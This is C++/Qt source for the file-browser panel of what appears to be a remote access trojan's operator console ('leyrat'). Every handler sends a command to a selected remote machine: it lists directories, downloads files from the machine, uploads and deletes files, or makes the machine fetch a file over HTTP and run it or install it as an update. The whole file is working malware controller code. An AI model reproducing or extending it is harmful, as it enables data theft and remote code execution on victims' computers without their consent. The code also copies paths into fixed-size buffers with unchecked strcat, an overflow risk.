#include "filebrowser.h"
#include "ui_filebrowser.h"
#include <QFileDialog.h>

#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "leyrat.h"
#include <Windows.h>

extern Ui::MainWindow *mainwin;
extern leyrat rat;
Ui::Filebrowser *fbrowser = 0;

Filebrowser::Filebrowser(QWidget *parent) :
    QDialog(parent),
    ui(new Ui::Filebrowser)
{
    ui->setupUi(this);
    this->setWindowTitle("File Browser");
    this->ui->treeWidget->setExpandsOnDoubleClick(false);
    fbrowser = ui;
    ui->pushButton->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_2->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_3->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_4->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_5->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_6->setFocusPolicy(Qt::NoFocus);
    ui->pushButton_7->setFocusPolicy(Qt::NoFocus);
    this->setWindowFlags(windowFlags() & ~Qt::WindowContextHelpButtonHint | Qt::MSWindowsFixedSizeDialogHint);
}

Filebrowser::~Filebrowser()
{
    delete ui;
}

void Filebrowser::on_pushButton_5_pressed()
{
    QString filename = QFileDialog::getOpenFileName(this, tr("Select File"), "C://", "All Files (*.*)");

    this->ui->plainTextEdit->clear();
    this->ui->plainTextEdit->appendPlainText(filename);


}

void Filebrowser::on_pushButton_pressed()//download
{
    QTreeWidget*treeWidget = this->ui->treeWidget;


    QTreeWidgetItem* header = treeWidget->headerItem();

    const QByteArray headerbytes = header->text(0).toLatin1();
    const char *cheader = headerbytes.data();

    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;


    const QByteArray texteditbytes = this->ui->plainTextEdit->toPlainText().toLatin1();
    const char *ctexteditbytes = texteditbytes.data();


    char savethere[260];
    memset(savethere, 0, 260);

    std::string penis = ctexteditbytes;
    penis.erase(0, penis.find_last_of('/')+1);

    strcat(savethere, cheader);

    strcat(savethere, penis.c_str());

    foreach (item, selected) {

        if(item->column() != 2)  continue;

        rat.Request_FileDownload(item->text().toStdString().c_str(), ctexteditbytes, savethere);
        break;
    }

}

void Filebrowser::on_pushButton_4_pressed()//upload
{
    QTreeWidget*treeWidget = this->ui->treeWidget;

    if(!treeWidget->currentItem())
        return;

    QTreeWidgetItem* header = treeWidget->headerItem();

    QString browse = treeWidget->currentItem()->text(this->ui->treeWidget->currentColumn());


    const QByteArray headerbytes = header->text(0).toLatin1();
    const char *cheader = headerbytes.data();

    const QByteArray browsebytes = browse.toLatin1();
    const char *cbrowse = browsebytes.data();



    std::string sheader = cheader;
    std::string sbrowse = cbrowse;

    if(strstr(cbrowse, ".."))
    {
        return;
    }else{
        sheader += browse.toStdString();
    }

    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_FileUpload(item->text().toStdString().c_str(), sheader.c_str());
        break;
    }
}

void Filebrowser::on_pushButton_2_pressed()//delete
{
    QTreeWidget*treeWidget = this->ui->treeWidget;


    QTreeWidgetItem* header = treeWidget->headerItem();

    if(!treeWidget->currentItem())
        return;

    QString browse = treeWidget->currentItem()->text(this->ui->treeWidget->currentColumn());


    const QByteArray headerbytes = header->text(0).toLatin1();
    const char *cheader = headerbytes.data();

    const QByteArray browsebytes = browse.toLatin1();
    const char *cbrowse = browsebytes.data();

    std::string sheader = cheader;
    std::string sbrowse = cbrowse;

    if(strstr(cbrowse, ".."))
    {
        return;
    }else{
        sheader += browse.toStdString();
    }

    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_FileDelete(item->text().toStdString().c_str(), sheader.c_str());
        break;
    }
}

void Filebrowser::on_treeWidget_doubleClicked(const QModelIndex &index)
{
    QTreeWidget*treeWidget = this->ui->treeWidget;


    QTreeWidgetItem* header = treeWidget->headerItem();

    QString browse = treeWidget->currentItem()->text(this->ui->treeWidget->currentColumn());


    const QByteArray headerbytes = header->text(0).toLatin1();
    const char *cheader = headerbytes.data();

    const QByteArray browsebytes = browse.toLatin1();
    const char *cbrowse = browsebytes.data();



    std::string sheader = cheader;
    std::string sbrowse = cbrowse;

    if(strstr(cbrowse, ".."))
    {
        size_t shitpos = sheader.find_last_of('/');

        sheader.erase(shitpos, sheader.length());
        sheader.erase(sheader.find_last_of('/'), sheader.length());

        sheader += "/*.*";
    }else{
        sheader += browse.toStdString();
        sheader += "/*.*";
    }

    printf("CHEADER: %s\nCBROWSE:%s\n", cheader, cbrowse);

    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_FileList(item->text().toStdString().c_str(), sheader.c_str());
        break;
    }



}

void Filebrowser::on_pushButton_3_pressed()//http execute
{
    QTreeWidget*treeWidget = this->ui->treeWidget;
    QTreeWidgetItem* header = treeWidget->headerItem();

    const QByteArray headerbytes = header->text(0).toLatin1();
    const char *cheader = headerbytes.data();

    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;


    const QByteArray texteditbytes =this->ui->plainTextEdit->toPlainText().toLatin1();
    const char *ctexteditbytes = texteditbytes.data();

    char savethere[260];
    memset(savethere, 0, 260);

    std::string penis = ctexteditbytes;
    penis.erase(0, penis.find_last_of('/')+1);

    strcat(savethere, cheader);
    strcat(savethere, penis.c_str());

    foreach (item, selected) {

        if(item->column() != 2)  continue;

        rat.Request_HTTPDownload(item->text().toStdString().c_str(), ctexteditbytes, savethere, true, false);
        break;
    }
}

void Filebrowser::on_pushButton_6_pressed()//http update
{
    QTreeWidget*treeWidget = this->ui->treeWidget;
    QTreeWidgetItem* header = treeWidget->headerItem();

    const QByteArray headerbytes = header->text(0).toLatin1();
    const char *cheader = headerbytes.data();

    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;


    const QByteArray texteditbytes =this->ui->plainTextEdit->toPlainText().toLatin1();
    const char *ctexteditbytes = texteditbytes.data();

    char savethere[260];
    memset(savethere, 0, 260);

    std::string penis = ctexteditbytes;
    penis.erase(0, penis.find_last_of('/')+1);

    strcat(savethere, cheader);

    strcat(savethere, penis.c_str());

    foreach (item, selected) {

        if(item->column() != 2)  continue;

        rat.Request_HTTPDownload(item->text().toStdString().c_str(), ctexteditbytes, savethere, false, true);
        break;
    }
}

void Filebrowser::on_pushButton_7_pressed()//http upload
{
    QTreeWidget*treeWidget = this->ui->treeWidget;
    QTreeWidgetItem* header = treeWidget->headerItem();

    const QByteArray headerbytes = header->text(0).toLatin1();
    const char *cheader = headerbytes.data();

    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;


    const QByteArray texteditbytes =this->ui->plainTextEdit->toPlainText().toLatin1();
    const char *ctexteditbytes = texteditbytes.data();

    char savethere[260];
    memset(savethere, 0, 260);

    std::string penis = ctexteditbytes;
    penis.erase(0, penis.find_last_of('/')+1);

    strcat(savethere, cheader);

    strcat(savethere, penis.c_str());

    foreach (item, selected) {

        if(item->column() != 2)  continue;

        rat.Request_HTTPDownload(item->text().toStdString().c_str(), ctexteditbytes, savethere, false, false);
        break;
    }
}
